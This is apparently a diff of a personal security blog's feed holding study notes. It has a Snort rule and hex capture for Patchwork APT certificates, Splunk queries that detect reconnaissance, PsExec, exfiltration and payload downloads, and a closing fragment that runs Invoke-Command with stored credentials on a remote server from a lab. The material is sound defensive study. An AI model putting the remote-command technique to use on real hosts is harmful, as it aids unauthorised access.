+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>alert tcp <span class="nv">$EXTERNAL_NET</span> any -&gt; <span class="nv">$HOME_NET</span> any <span class="o">(</span>msg:<span class="s2">"Patchwork SSL Cert Detected"</span><span class="p">;</span> flow:established,from_server<span class="p">;</span> content:<span class="s2">"|55 04 03|"</span><span class="p">;</span> content:<span class="s2">"|08|toigetgf"</span>, distance 1, within 9<span class="p">;</span> classtype:trojan-activity<span class="p">;</span> sid:10000008<span class="p">;</span> rev:1<span class="p">;</span><span class="o">)</span>
+</code></pre></div></div>
+
+<p>The Snort rule above is designed to detect certain variations of malware used by the Patchwork APT. Let’s break down the important parts of this rule to understand its workings.</p>
+
+<ul>
+  <li>flow:established,from_server;: This keyword pair signifies that we’re interested in observing established flows of traffic originating from the server.</li>
+  <li>content:”|55 04 03|”;: This rule is looking for the specific hex values 55 04 03 within the payload of the packet. These hex values represent the ASN.1 (Abstract Syntax Notation One) tag for the “common name” field in an X.509 certificate, which is often used in SSL/TLS certificates to denote the domain name that the certificate applies to.</li>
+  <li>content:”|08|toigetgf”, distance 1, within 9;: Following the common name field, this rule looks for the string toigetgf. The distance 1 means that Snort should start looking for the string toigetgf 1 byte after the end of the previous content match. The within 9 sets an upper limit on how far into the packet’s payload Snort should search, starting from the beginning of this content field.</li>
+</ul>
+
+<pre><code class="language-txt">06/01-19:25:29.876240 [**] [1:10000008:1] "Patchwork SSL Cert Detected" [**] [Classification: A Network Trojan was detected] [Priority: 1] {TCP} 45.43.192.172:8443 -&gt; 192.168.1.37:49211
+
+ssl.stream_tcp[807]:
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+16 03 03 00 51 02 00 00  4D 03 03 74 19 1E 0B 50  ....Q... M..t...P
+F2 80 7F 3F 81 1C 07 CF  58 0B A0 48 B0 F7 A7 D4  ...?.... X..H....
+8B 08 53 2D 10 62 F9 23  F0 CD 76 20 A3 17 4D A2  ..S-.b.# ..v ..M.
+35 58 EC 8B 4A F2 74 6D  72 7F CC 80 45 E8 1E 73  5X..J.tm r...E..s
+2E 22 18 99 75 FB D1 FF  0E 97 C8 04 00 3C 00 00  ."..u... .....&lt;..
+05 FF 01 00 01 00 16 03  03 02 C3 0B 00 02 BF 00  ........ ........
+02 BC 00 02 B9 30 82 02  B5 30 82 01 9D A0 03 02  .....0.. .0......
+01 02 02 08 44 0E 87 29  65 41 6D 2A 30 0D 06 09  ....D..) eAm*0...
+2A 86 48 86 F7 0D 01 01  0B 05 00 30 13 31 11 30  *.H..... ...0.1.0
+0F 06 03 55 04 03 0C 08  74 6F 69 67 65 74 67 66  ...U.... toigetgf
+30 1E 17 0D 31 34 31 31  31 38 30 36 30 38 33 38  0...1411 18060838
+5A 17 0D 32 34 31 31 31  35 30 36 30 38 33 38 5A  Z..24111 5060838Z
+30 13 31 11 30 0F 06 03  55 04 03 0C 08 74 6F 69  0.1.0... U....toi
+67 65 74 67 66 30 82 01  22 30 0D 06 09 2A 86 48  getgf0.. "0...*.H
+86 F7 0D 01 01 01 05 00  03 82 01 0F 00 30 82 01  ........ .....0..
+0A 02 82 01 01 00 C6 B9  1B 97 5C 6E DA 23 4C 02  ........ ..\n.#L.
+EC A6 A8 09 56 FA 85 5E  35 75 A8 BB 63 B5 81 30  ....V..^ 5u..c..0
+90 91 45 D7 19 36 0B 20  DF 70 37 0E 91 05 FB 86  ..E..6.  .p7.....
+22 E8 56 3D A5 89 BA 13  01 60 DF 43 A6 F0 05 7B  ".V=.... .`.C...{
+5A 04 7F 53 14 80 C1 64  EA 9C 09 98 A2 B8 99 EA  Z..S...d ........
+91 26 52 81 62 D3 BB CE  A2 4E E7 BB 97 C9 19 D2  .&amp;R.b... .N......
+EF 61 8A A5 50 9A D7 6B  9F 9D 54 7B AE E2 6F 53  .a..P..k ..T{..oS
+BB 7A B4 D2 93 06 73 96  CD 04 19 55 D3 7A DA 34  .z....s. ...U.z.4
+8F 05 2D 2E 98 7F 6C 9E  0B C8 41 A2 49 BA FB CC  ..-...l. ..A.I...
+A4 20 BD 8A E5 18 27 88  BB 87 F9 F6 F3 56 8F 73  . ....'. .....V.s
+D6 BA 92 29 F9 F0 A6 AB  F5 FD 5F E0 92 C6 96 2D  ...).... .._....-
+41 80 FA 0B 4C C9 9B AE  2D 69 F7 9D B5 4B 14 81  A...L... -i...K..
+AD F8 71 6F 2B A8 59 66  6E FD B5 8B 3B 14 09 F7  ..qo+.Yf n...;...
+B8 FC 20 EF 7D A0 D5 40  D6 66 BB 65 B6 FC 92 3A  .. .}..@ .f.e...:
+71 F5 BA 5B F1 07 A5 FD  E3 11 F2 A9 51 6C 16 8F  q..[.... ....Ql..
+C8 72 B7 A0 D7 26 43 3A  18 7B F8 7B 38 72 01 37  .r...&amp;C: .{.{8r.7
+4F 42 28 42 2F 01 02 03  01 00 01 A3 0D 30 0B 30  OB(B/... .....0.0
+09 06 03 55 1D 13 04 02  30 00 30 0D 06 09 2A 86  ...U.... 0.0...*.
+48 86 F7 0D 01 01 0B 05  00 03 82 01 01 00 2D 0E  H....... ......-.
+CC D5 50 AB DF 20 37 BB  71 10 31 C5 1F 17 EC F9  ..P.. 7. q.1.....
+D7 20 1A 19 39 F4 DE D8  BA C1 A3 F5 57 E0 E0 6B  . ..9... ....W..k
+DC 6F E1 1F 6B 07 98 FB  38 1A 0A 77 BD B4 0A 94  .o..k... 8..w....
+01 45 95 0C 09 F1 43 D5  7D 57 E7 D6 E7 74 98 6C  .E....C. }W...t.l
+4F D0 46 81 F2 9D 5A 29  1E BD 7F 03 5B 64 B3 98  O.F...Z) ....[d..
+D4 52 B0 E1 CE 11 62 68  31 1D CC 0F DD B6 AA 5C  .R....bh 1......\
+44 D0 44 18 9E 3D AE 30  C7 10 C6 97 F6 C1 C9 D7  D.D..=.0 ........
+11 13 44 AA B4 C9 2D 0C  AC 2B AD 9A CB 7B 5D 51  ..D...-. .+...{]Q
+3F 45 C6 2E 99 CF 71 F6  66 9A 09 28 44 28 34 3B  ?E....q. f..(D(4;
+EC 0B A6 F4 E3 5F FE 7E  30 59 DC 3D 4E 33 22 11  ....._.~ 0Y.=N3".
+BA CA 8A 4B 41 5D 97 3E  CD BB 3C DD 28 37 12 47  ...KA].&gt; ..&lt;.(7.G
+E0 BE AC 3B 13 EC 59 A0  E3 1A CE 28 B2 11 5D 3B  ...;..Y. ...(..];
+AC AD CF 32 F5 EA CB B2  92 20 BC 5C 3C 4C B9 43  ...2.... . .\&lt;L.C
+5A BC 1B 2F E3 F3 DF DC  04 DB 24 6A 73 13 EA E5  Z../.... ..$js...
+32 45 6A F6 D9 CC 66 9C  80 99 3D EC D9 2D 13 9A  2Ej...f. ..=..-..
+9A 6F 90 69 47 95 B6 46  D8 F2 E8 EF CC CA 16 03  .o.iG..F ........
+03 00 04 0E 00 00 00                             .......
+- - - - - - - - - - - -  - - - - - - - - - - - -  - - - - - - - - -
+&lt;SNIP&gt;
+</code></pre>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="notes" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Windows Attack And Defense</title><link href="http://localhost:4000/blog/notes/2024-08-12-WindowsAttackAndDefense/" rel="alternate" type="text/html" title="Windows Attack And Defense" /><published>2024-08-12T00:00:00-06:00</published><updated>2024-08-12T00:00:00-06:00</updated><id>http://localhost:4000/blog/notes/WindowsAttackAndDefense</id><content type="html" xml:base="http://localhost:4000/blog/notes/2024-08-12-WindowsAttackAndDefense/"><![CDATA[<ul id="markdown-toc">
+  <li><a href="#basic-searching" id="markdown-toc-basic-searching">Basic Searching</a></li>
+</ul>
+
+<h2 id="basic-searching">Basic Searching</h2>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="notes" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Log Sources and Investigating with Splunk</title><link href="http://localhost:4000/blog/notes/2024-08-11-logSourcesAndInvestigatingSplunk/" rel="alternate" type="text/html" title="Log Sources and Investigating with Splunk" /><published>2024-08-11T00:00:00-06:00</published><updated>2024-08-11T00:00:00-06:00</updated><id>http://localhost:4000/blog/notes/logSourcesAndInvestigatingSplunk</id><content type="html" xml:base="http://localhost:4000/blog/notes/2024-08-11-logSourcesAndInvestigatingSplunk/"><![CDATA[<ul id="markdown-toc">
+  <li><a href="#basic-searching" id="markdown-toc-basic-searching">Basic Searching</a></li>
+  <li><a href="#examples" id="markdown-toc-examples">Examples</a></li>
+  <li><a href="#apps" id="markdown-toc-apps">Apps</a></li>
+  <li><a href="#intrusion-detection" id="markdown-toc-intrusion-detection">Intrusion Detection</a></li>
+  <li><a href="#detecting-attacker-behavior-with-splunk-based-on-ttps" id="markdown-toc-detecting-attacker-behavior-with-splunk-based-on-ttps">Detecting Attacker Behavior With Splunk Based On TTPs</a>    <ul>
+      <li><a href="#detection-of-reconnaissance-activities-leveraging-native-windows-binaries" id="markdown-toc-detection-of-reconnaissance-activities-leveraging-native-windows-binaries">Detection Of Reconnaissance Activities Leveraging Native Windows Binaries</a></li>
+      <li><a href="#detection-of-requesting-malicious-payloadstools-hosted-on-reputablewhitelisted-domains-such-as-githubusercontentcom" id="markdown-toc-detection-of-requesting-malicious-payloadstools-hosted-on-reputablewhitelisted-domains-such-as-githubusercontentcom">Detection Of Requesting Malicious Payloads/Tools Hosted On Reputable/Whitelisted Domains (Such As githubusercontent.com)</a></li>
+      <li><a href="#example-detection-of-psexec-usage" id="markdown-toc-example-detection-of-psexec-usage">Example: Detection Of PsExec Usage</a></li>
+      <li><a href="#leveraging-sysmon-event-id-11" id="markdown-toc-leveraging-sysmon-event-id-11">Leveraging Sysmon Event ID 11</a></li>
+      <li><a href="#leveraging-sysmon-event-id-18" id="markdown-toc-leveraging-sysmon-event-id-18">Leveraging Sysmon Event ID 18</a></li>
+      <li><a href="#detection-of-utilizing-archive-files-for-transferring-tools-or-data-exfiltration" id="markdown-toc-detection-of-utilizing-archive-files-for-transferring-tools-or-data-exfiltration">Detection Of Utilizing Archive Files For Transferring Tools Or Data Exfiltration</a></li>
+      <li><a href="#detection-of-utilizing-powershell-or-ms-edge-for-downloading-payloadstools" id="markdown-toc-detection-of-utilizing-powershell-or-ms-edge-for-downloading-payloadstools">Detection Of Utilizing PowerShell or MS Edge For Downloading Payloads/Tools</a></li>
+      <li><a href="#detection-of-execution-from-atypical-or-suspicious-locations" id="markdown-toc-detection-of-execution-from-atypical-or-suspicious-locations">Detection Of Execution From Atypical Or Suspicious Locations</a></li>
+      <li><a href="#detection-of-executables-or-dlls-being-created-outside-the-windows-directory" id="markdown-toc-detection-of-executables-or-dlls-being-created-outside-the-windows-directory">Detection Of Executables or DLLs Being Created Outside The Windows Directory</a></li>
+      <li><a href="#detection-of-misspelling-legitimate-binaries" id="markdown-toc-detection-of-misspelling-legitimate-binaries">Detection Of Misspelling Legitimate Binaries</a></li>
+      <li><a href="#detection-of-using-non-standard-ports-for-communicationstransfers" id="markdown-toc-detection-of-using-non-standard-ports-for-communicationstransfers">Detection Of Using Non-standard Ports For Communications/Transfers</a></li>
+    </ul>
+  </li>
+  <li><a href="#streamstats" id="markdown-toc-streamstats">Streamstats</a></li>
+</ul>
+
+<h2 id="basic-searching">Basic Searching</h2>
+
+<p>Splunk use SPL language that contains houndred of commands, functions, arguments, clauses that help us to make a good search of information. To make our first explicit search we can use. We need to remember for searching in the specific time or range of it that we want to get the information.</p>
+
+<pre><code class="language-spl">search index="main" "UNKNOWN"
+</code></pre>
+
+<p>Main means that is only gonna search in main index information(Sysmon or Windows Event logs), and “UNKNOWN” means to search for that specific pattern. We can use * to make the search less specific.</p>
+
+<p>Splunk uses a lot of fields data like source, sourcetype, host, eventcode. We can make search with comoparison operators (=, &lt;, &gt;, &lt;=, &gt;=).</p>
+
+<pre><code class="language-spl">search index="main" EventCode!=1
+</code></pre>
+
+<p>We can use field command to specify which files would included. In this example we are using a filter that give us all the information in index main with sourcetype WinEventLog:Sysmon and Eventcode equal to 1, but excluding the user that is executing the process.</p>
+
+<pre><code class="language-spl">search index="main" sourceType="WinEventLog:Sysmon" EventCode=1 | fields - User
+</code></pre>
+
+<p>We can filter in more tabular way with table</p>
+
+<pre><code class="language-spl">index="main" sourceType="WinEventLog:Sysmon" EventCode=1 | table _time host Image
+</code></pre>
+
+<p>We can rename some fields with rename</p>
+
+<pre><code class="language-spl">index="main" sourceType="WinEventLog:Sysmon" EventCode=1 | raname Image as Process
+</code></pre>
+
+<p>We can remove duplicated events:</p>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | dedup Image
+</code></pre>
+
+<p>We can sort information with sort, this command sort the information in descending or ascending order.</p>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | sort _time
+index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | sort - _time
+</code></pre>
+<p>We can count all the events that match fields that we put in search. For this situation we can use stats or chart function.</p>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | stats count by _time, Image
+index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | chart count by _time, Image
+</code></pre>
+
+<p>The eval command creates or redifines fields</p>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | eval Process_path=lower(Image)
+</code></pre>
+
+<p>We can filter for regular expresion</p>
+
+<pre><code class="language-spl">index="main" EventCode=4662 | rex max_match=0 "[^%](?&lt;guid&gt;{.*})" | table guid
+</code></pre>
+
+<p>We can use lookup files to make search with more matches, for example, you can create a file that lists common malicious files.</p>
+
+<pre><code class="language-csv">filename, is_malware
+notepad.exe, false
+cmd.exe, false
+powershell.exe, false
+sharphound.exe, true
+randomfile.exe, true
+</code></pre>
+<ul>
+  <li>index=”main” sourcetype=”WinEventLog:Sysmon” EventCode=1: This is the search criteria. It’s looking for Sysmon logs (as identified by the sourcetype) with an EventCode of 1 (which represents process creation events) in the “main” index.</li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>rex field=Image “(?P<filename>[^\\\]+)$": This command is using the regular expression (regex) to extract a part of the Image field. The Image field in Sysmon EventCode=1 logs typically contains the full file path of the process. This regex is saying: Capture everything after the last backslash (which should be the filename itself) and save it as filename.</filename></td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>eval filename=lower(filename): This command is taking the filename that was just extracted and converting it to lowercase. The lower() function is used to ensure the search is case-insensitive.</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>lookup malware_lookup.csv filename OUTPUTNEW is_malware: This command is performing a lookup operation using the filename as a key. The lookup table (malware_lookup.csv) is expected to contain a list of filenames of known malicious executables. If a match is found in the lookup table, the new field is_malware is added to the event, which indicates whether or not the process is considered malicious based on the lookup table. &lt;– filename in this part of the query is the first column title in the CSV.</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>table filename, is_malware: This command is formatting the output to show only the fields filename and is_malware. If is_malware is not present in a row, it means that no match was found in the lookup table for that filename.</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+</ul>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | rex field=Image "(?P&lt;filename&gt;[^\\\]+)$" | eval filename=lower(filename) | lookup malware.csv filename OUTPUTNEW is_malware | table filename, is_malware 
+|  dedup filename
+</code></pre>
+
+<p>To search for a range of time we can use</p>
+
+<pre><code class="language-spl">index="main" earliest=-7d EventCode!=1
+</code></pre>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" (EventCode=1 OR EventCode=3) | transaction Image startswith=eval(EventCode=1) endswith=eval(EventCode=3) maxspan=1m | table Image |  dedup Image 
+</code></pre>
+
+<ul>
+  <li>index=”main” sourcetype=”WinEventLog:Sysmon” (EventCode=1 OR EventCode=3): This is the search criteria. It’s pulling from the main index where the sourcetype is WinEventLog:Sysmon and the EventCode is either 1 or 3. In Sysmon logs, EventCode 1 refers to a process creation event, and EventCode 3 refers to a network connection event.</li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>transaction Image startswith=eval(EventCode=1) endswith=eval(EventCode=3) maxspan=1m: The transaction command is used here to group events based on the Image field, which represents the executable or script involved in the event. This grouping is subject to the conditions: the transaction starts with an event where EventCode is 1 and ends with an event where EventCode is 3. The maxspan=1m clause limits the transaction to events occurring within a 1-minute window. The transaction command can link together related events to provide a better understanding of the sequences of activities happening within a system.</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>table Image: This command formats the output into a table, displaying only the Image field.</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+  <li>
+    <table>
+      <tbody>
+        <tr>
+          <td>dedup Image: Finally, the dedup command removes duplicate entries from the result set. Here, it’s eliminating any duplicate Image values. The command keeps only the first occurrence and removes subsequent duplicates based on the Image field.</td>
+        </tr>
+      </tbody>
+    </table>
+  </li>
+</ul>
+
+<p>This query is gonna help us to find event that have subsequent events, in this example we are looking for events that inicate a process and then maka a network connection.</p>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 NOT [ search index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | top limit=100 Image | fields Image ] | table _time, Image, CommandLine, User, ComputerName
+</code></pre>
+<p>Whith this query we can search some events with event code 1 but excluding the first 100 matches.</p>
+
+<h2 id="examples">Examples</h2>
+
+<p>Find username counts in kerberos authentication tries.</p>
+
+<pre><code class="language-spl">index="main" EventCode="4768" |  chart count by Account_Name
+</code></pre>
+
+<p>Find through an SPL search against all 4624 events the count of distinct computers accessed by the account name SYSTEM</p>
+
+<pre><code class="language-spl">index="main" EventCode="4624" Account_Name="SYSTEM" |  chart count by ComputerName
+</code></pre>
+
+<p>We can search for authenticated users in a time span of 10 minutes</p>
+
+<pre><code class="language-spl">index="*" EventCode=4624 
+| stats range(_time) as rango count as total_attempts by Account_Name
+| where rango &lt;= 600
+| sort - rango
+| head 1
+</code></pre>
+
+<h2 id="apps">Apps</h2>
+
+<p>We can use <code class="language-plaintext highlighter-rouge">Sysmon</code> application by downloading it from splunk website. With this we are able to search of specific information. We need to fix some queries in this app, just map the correct field that you want to serch modifying de default one.</p>
+
+<pre><code class="language-spl">`sysmon` CommandLine="net  view*" | stats count by ComputerName,CommandLine
+</code></pre>
+
+<h2 id="intrusion-detection">Intrusion Detection</h2>
+
+<ul>
+  <li>Sysmon Event ID 1 - Process Creation: Useful for hunts targeting abnormal parent-child process hierarchies, as illustrated in the first lesson with Process Hacker. It’s an event we can use later.</li>
+  <li>Sysmon Event ID 2 - A process changed a file creation time: Helpful in spotting “time stomp” attacks, where attackers alter file creation times. Bear in mind, not all such actions signal malicious intent.</li>
+  <li>Sysmon Event ID 3 - Network connection: A source of abundant noise since machines are perpetually establishing network connections. We may uncover anomalies, but let’s consider other quieter areas first.</li>
+  <li>Sysmon Event ID 4 - Sysmon service state changed: Could be a useful hunt if attackers attempt to stop Sysmon, though the majority of these events are likely benign and informational, considering Sysmon’s frequent legitimate starts and stops.</li>
+  <li>Sysmon Event ID 5 - Process terminated: This might aid us in detecting when attackers kill key processes or use sacrificial ones. For instance, Cobalt Strike often spawns temporary processes like werfault, the termination of which would be logged here, as well as the creation in ID 1.</li>
+  <li>Sysmon Event ID 6 - Driver loaded: A potential flag for BYOD (bring your own driver) attacks, though this is less common. Before diving deep into this, let’s weed out more conspicuous threats first.</li>
+  <li>Sysmon Event ID 7 - Image loaded: Allows us to track dll loads, which is handy in detecting DLL hijacks.</li>
+  <li>Sysmon Event ID 8 - CreateRemoteThread: Potentially aids in identifying injected threads. While remote threads can be created legitimately, if an attacker misuses this API, we can potentially trace their rogue process and what they injected into.</li>
+  <li>Sysmon Event ID 10 - ProcessAccess: Useful for spotting remote code injection and memory dumping, as it records when handles on processes are made.</li>
+  <li>Sysmon Event ID 11 - FileCreate: With many files being created frequently due to updates, downloads, etc., it might be challenging to aim our hunt directly here. However, these events can be beneficial in correlating or identifying a file’s origins later.</li>
+  <li>Sysmon Event ID 12 - RegistryEvent (Object create and delete) &amp; Sysmon Event ID 13 - RegistryEvent (Value Set): While numerous events take place here, many registry events can be malicious, and with a good idea of what to look for, hunting here can be fruitful.</li>
+  <li>Sysmon Event ID 15 - FileCreateStreamHash: Relates to file streams and the “Mark of the Web” pertaining to external downloads, but we’ll leave this aside for now.</li>
+  <li>Sysmon Event ID 16 - Sysmon config state changed: Logs alterations in Sysmon configuration, useful for spotting tampering.</li>
+  <li>Sysmon Event ID 17 - Pipe created &amp; Sysmon Event ID 18 - Pipe connected: Record pipe creations and connections. They can help observe malware’s interprocess communication attempts, usage of PsExec, and SMB lateral movement.</li>
+  <li>Sysmon Event ID 22 - DNSEvent: Tracks DNS queries, which can be beneficial for monitoring beacon resolutions and DNS beacons.</li>
+  <li>Sysmon Event ID 23 - FileDelete: Monitors file deletions, which can provide insights into whether a threat actor cleaned up their malware, deleted crucial files, or possibly attempted a ransomware attack.</li>
+  <li>Sysmon Event ID 25 - ProcessTampering (Process image change): Alerts on behaviors such as process herpadering, acting as a mini AV alert filter.</li>
+</ul>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 (Image="*cmd.exe" OR Image="*powershell.exe") | stats count by ParentImage, Image
+
+index="main" CallTrace="*UNKNOWN*" SourceImage!="*Microsoft.NET*" CallTrace!=*ni.dll* CallTrace!=*clr.dll* CallTrace!=*wow64* SourceImage!="C:\\Windows\\Explorer.EXE" | where SourceImage!=TargetImage | stats count by SourceImage, TargetImage, CallTrace
+
+index="main" 10.0.0.229 sourcetype="WinEventLog:sysmon" | stats count by CommandLine
+</code></pre>
+
+<h2 id="detecting-attacker-behavior-with-splunk-based-on-ttps">Detecting Attacker Behavior With Splunk Based On TTPs</h2>
+
+<h3 id="detection-of-reconnaissance-activities-leveraging-native-windows-binaries">Detection Of Reconnaissance Activities Leveraging Native Windows Binaries</h3>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 Image=*\\ipconfig.exe OR Image=*\\net.exe OR Image=*\\whoami.exe OR Image=*\\netstat.exe OR Image=*\\nbtstat.exe OR Image=*\\hostname.exe OR Image=*\\tasklist.exe | stats count by Image,CommandLine | sort - count
+</code></pre>
+<h3 id="detection-of-requesting-malicious-payloadstools-hosted-on-reputablewhitelisted-domains-such-as-githubusercontentcom">Detection Of Requesting Malicious Payloads/Tools Hosted On Reputable/Whitelisted Domains (Such As githubusercontent.com)</h3>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=22  QueryName="*github*" | stats count by Image, QueryName
+</code></pre>
+
+<h3 id="example-detection-of-psexec-usage">Example: Detection Of PsExec Usage</h3>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=13 Image="C:\\Windows\\system32\\services.exe" TargetObject="HKLM\\System\\CurrentControlSet\\Services\\*\\ImagePath" | rex field=Details "(?&lt;reg_file_name&gt;[^\\\]+)$" | eval reg_file_name = lower(reg_file_name), file_name = if(isnull(file_name),reg_file_name,lower(file_name)) | stats values(Image) AS Image, values(Details) AS RegistryDetails, values(_time) AS EventTimes, count by file_name, ComputerName
+</code></pre>
+
+<h3 id="leveraging-sysmon-event-id-11">Leveraging Sysmon Event ID 11</h3>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image=System | stats count by TargetFilename
+</code></pre>
+<h3 id="leveraging-sysmon-event-id-18">Leveraging Sysmon Event ID 18</h3>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=18 Image=System | stats count by PipeName
+</code></pre>
+
+<h3 id="detection-of-utilizing-archive-files-for-transferring-tools-or-data-exfiltration">Detection Of Utilizing Archive Files For Transferring Tools Or Data Exfiltration</h3>
+
+<pre><code class="language-spl">index="main" EventCode=11 (TargetFilename="*.zip" OR TargetFilename="*.rar" OR TargetFilename="*.7z") | stats count by ComputerName, User, TargetFilename | sort - count
+</code></pre>
+
+<h3 id="detection-of-utilizing-powershell-or-ms-edge-for-downloading-payloadstools">Detection Of Utilizing PowerShell or MS Edge For Downloading Payloads/Tools</h3>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="*powershell.exe*" |  stats count by Image, TargetFilename |  sort + count
+
+index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="*msedge.exe" TargetFilename=*"Zone.Identifier" |  stats count by TargetFilename |  sort + count
+
+</code></pre>
+
+<h3 id="detection-of-execution-from-atypical-or-suspicious-locations">Detection Of Execution From Atypical Or Suspicious Locations</h3>
+
+<pre><code class="language-spl">index="main" EventCode=1 | regex Image="C:\\\\Users\\\\.*\\\\Downloads\\\\.*" |  stats count by Image
+</code></pre>
+
+<h3 id="detection-of-executables-or-dlls-being-created-outside-the-windows-directory">Detection Of Executables or DLLs Being Created Outside The Windows Directory</h3>
+
+<pre><code class="language-spl">index="main" EventCode=11 (TargetFilename="*.exe" OR TargetFilename="*.dll") TargetFilename!="*\\windows\\*" | stats count by User, TargetFilename | sort + count
+</code></pre>
+
+<h3 id="detection-of-misspelling-legitimate-binaries">Detection Of Misspelling Legitimate Binaries</h3>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 (CommandLine="*psexe*.exe" NOT (CommandLine="*PSEXESVC.exe" OR CommandLine="*PsExec64.exe")) OR (ParentCommandLine="*psexe*.exe" NOT (ParentCommandLine="*PSEXESVC.exe" OR ParentCommandLine="*PsExec64.exe")) OR (ParentImage="*psexe*.exe" NOT (ParentImage="*PSEXESVC.exe" OR ParentImage="*PsExec64.exe")) OR (Image="*psexe*.exe" NOT (Image="*PSEXESVC.exe" OR Image="*PsExec64.exe")) |  table Image, CommandLine, ParentImage, ParentCommandLine
+</code></pre>
+
+<h3 id="detection-of-using-non-standard-ports-for-communicationstransfers">Detection Of Using Non-standard Ports For Communications/Transfers</h3>
+
+<pre><code class="language-spl">index="main" EventCode=3 NOT (DestinationPort=80 OR DestinationPort=443 OR DestinationPort=22 OR DestinationPort=21) | stats count by SourceIp, DestinationIp, DestinationPort | sort - count
+</code></pre>
+
+<h2 id="streamstats">Streamstats</h2>
+
+<p>We can use streamstats tu obtain average or standard deviation of processes, connection, etc.</p>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=3 | bin _time span=1h | stats count as NetworkConnections by _time, Image | streamstats time_window=24h avg(NetworkConnections) as avg stdev(NetworkConnections) as stdev by Image | eval isOutlier=if(NetworkConnections &gt; (avg + (0.5*stdev)), 1, 0) | search isOutlier=1
+
+index="main" EventCode=1 (CommandLine="*cmd.exe*") | bucket _time span=1h | stats count as cmdCount by _time User CommandLine | eventstats avg(cmdCount) as avg stdev(cmdCount) as stdev | eval isOutlier=if(cmdCount &gt; avg+1.5*stdev, 1, 0) | search isOutlier=1
+</code></pre>
+
+<p>Detection of high number of dll loads</p>
+
+<pre><code class="language-spl">index="main" EventCode=7 | bucket _time span=1h | stats dc(ImageLoaded) as unique_dlls_loaded by _time, Image | where unique_dlls_loaded &gt; 3 | stats count by Image, unique_dlls_loaded
+
+index="main" EventCode=7 NOT (Image="C:\\Windows\\System32*") NOT (Image="C:\\Program Files (x86)*") NOT (Image="C:\\Program Files*") NOT (Image="C:\\ProgramData*") NOT (Image="C:\\Users\\waldo\\AppData*")| bucket _time span=1h | stats dc(ImageLoaded) as unique_dlls_loaded by _time, Image | where unique_dlls_loaded &gt; 3 | stats count by Image, unique_dlls_loaded | sort - unique_dlls_loaded
+</code></pre>
+
+<p>Execution of the same process (Image) in a same maching</p>
+
+<pre><code class="language-spl">index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | transaction ComputerName, Image | where mvcount(ProcessGuid) &gt; 1 | stats count by Image, ParentImage
+</code></pre>]]></content><author><name>Armando Villalobos</name><email>armando.villalobos@outlook.es</email></author><category term="notes" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Introduction to Networks</title><link href="http://localhost:4000/blog/notes/2024-06-28-introductionToNetworks/" rel="alternate" type="text/html" title="Introduction to Networks" /><published>2024-06-28T00:00:00-06:00</published><updated>2024-06-28T00:00:00-06:00</updated><id>http://localhost:4000/blog/notes/introductionToNetworks</id><content type="html" xml:base="http://localhost:4000/blog/notes/2024-06-28-introductionToNetworks/"><![CDATA[<ul id="markdown-toc">
   <li><a href="#the-tcpip-model" id="markdown-toc-the-tcpip-model">The TCP/IP model</a></li>
   <li><a href="#network-access-layer" id="markdown-toc-network-access-layer">Network access layer</a></li>
   <li><a href="#internet-layer" id="markdown-toc-internet-layer">Internet layer</a></li>
@@ -1589,230 +3170,4 @@ este grupo tiene los privilegios del grupo domain admins.</p>
 
 <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span><span class="nb">type </span>C:<span class="se">\P</span>ROGRA~1<span class="se">\k</span>eepmeon<span class="se">\k</span>eepmeon.bat<span class="o">}</span>
